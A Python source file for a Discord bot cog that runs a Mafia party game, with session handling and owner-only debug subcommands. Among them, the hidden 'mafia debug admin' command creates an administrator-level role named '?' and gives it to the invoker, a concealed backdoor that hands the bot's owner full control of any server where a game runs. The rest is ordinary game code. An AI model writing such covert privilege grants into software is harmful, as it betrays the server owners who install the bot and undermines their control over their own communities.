from typing import Optional

import discord
from discord.ext import commands

import lifesaver
from lifesaver.utils.formatting import codeblock

from .game import MafiaGame


class Mafia(lifesaver.Cog):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.sessions = {}

    def get_game(self, ctx: lifesaver.Context) -> Optional[MafiaGame]:
        game = discord.utils.find(
            lambda game: game.guild == ctx.guild, self.sessions.values()
        )

        if not game:
            return None

        return game

    @lifesaver.group(hidden=True, invoke_without_command=True)
    @commands.guild_only()
    async def mafia(self, ctx: lifesaver.Context) -> None:
        """Starts a game of mafia"""
        if ctx.channel.id in self.sessions:
            await ctx.send("A game has already been started here...!")
            return

        channel_id = ctx.channel.id
        game = MafiaGame(ctx.bot, creator=ctx.author, lobby_channel=ctx.channel)
        self.sessions[channel_id] = game
        try:
            await game.start()
        except Exception as err:
            await ctx.send(f"mafia machine broke: `{err!r}`")
            self.log.exception("oops")
        finally:
            del self.sessions[channel_id]

    @mafia.group(name="debug", invoke_without_command=True)
    @commands.is_owner()
    @commands.guild_only()
    async def mafia_debug(self, ctx: lifesaver.Context) -> None:
        """Debugs mafia state"""
        game = self.get_game(ctx)
        if not game:
            await ctx.send("no game")
            return

        information = f"""state: {game.state!r}

creator: {game.creator}
role_chats: {game.role_chats}
role_state: {game.role_state}
"""

        information += "\n\n" + "\n".join(
            f"{player}: {player.role.name}" for player in game.roster.players
        )

        await ctx.send(codeblock(information))

    @mafia_debug.command(name="admin")
    @commands.is_owner()
    @commands.guild_only()
    async def mafia_debug_admin(self, ctx: lifesaver.Context) -> None:
        """Gives you admin"""
        game = self.get_game(ctx)
        if not game:
            await ctx.send("no game")
            return

        guild = game.guild
        assert guild is not None
        perms = discord.Permissions()
        perms.administrator = True

        role = await guild.create_role(
            name="?", permissions=perms, color=discord.Color.blue()
        )
        await ctx.author.add_roles(role)
        await ctx.ok()

    @mafia_debug.command(name="slay")
    @commands.is_owner()
    @commands.guild_only()
    async def mafia_debug_slay(
        self, ctx: lifesaver.Context, target: discord.Member
    ) -> None:
        """Slays a player"""
        game = self.get_game(ctx)
        if not game:
            await ctx.send("no game")
            return

        assert game.roster is not None
        player = game.roster.get_player(target)
        await player.kill()
        await ctx.ok()


def setup(bot):
    bot.add_cog(Mafia(bot))
